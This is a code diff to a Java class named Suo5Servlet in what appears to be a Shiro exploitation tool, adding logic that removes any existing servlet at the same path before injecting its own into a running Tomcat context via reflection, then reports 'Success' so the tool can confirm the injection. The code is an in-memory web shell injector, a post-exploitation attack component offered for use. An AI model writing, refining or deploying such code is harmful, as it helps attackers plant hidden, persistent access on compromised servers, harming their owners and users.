@@ -1,5 +1,6 @@
 package com.y5neko.shiroexp.memshell;
 
+import org.apache.catalina.Container;
 import org.apache.catalina.Wrapper;
 import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.ApplicationContextFacade;
@@ -181,6 +182,22 @@ public final class Suo5Servlet extends ClassLoader implements Servlet, Runnable,
         Field standardContextField = applicationContext.getClass().getDeclaredField("context");
         standardContextField.setAccessible(true);
         StandardContext standardContext = (StandardContext)standardContextField.get(applicationContext);
+
+        String existsMsg = null;
+        // 检查是否已存在相同 path 的 Servlet
+        Container[] containers = standardContext.findChildren();
+        for (Container container : containers) {
+            if (container instanceof Wrapper) {
+                Wrapper existingWrapper = (Wrapper) container;
+                if (existingWrapper.getName().equals(this.path)) {
+                    existsMsg = "Servlet already exists, overwriting...";
+                    // 删除已存在的 Servlet
+                    standardContext.removeChild(existingWrapper);
+                    break;
+                }
+            }
+        }
+
         Wrapper wrapper = standardContext.createWrapper();
         wrapper.setName(this.path);
         standardContext.addChild(wrapper);
@@ -195,6 +212,9 @@ public final class Suo5Servlet extends ClassLoader implements Servlet, Runnable,
         }
 
         // 返回 Success 标记，让工具能够检测是否注入成功
+        if (existsMsg != null) {
+            return existsMsg + " Success";
+        }
         return "Success";
     }
 
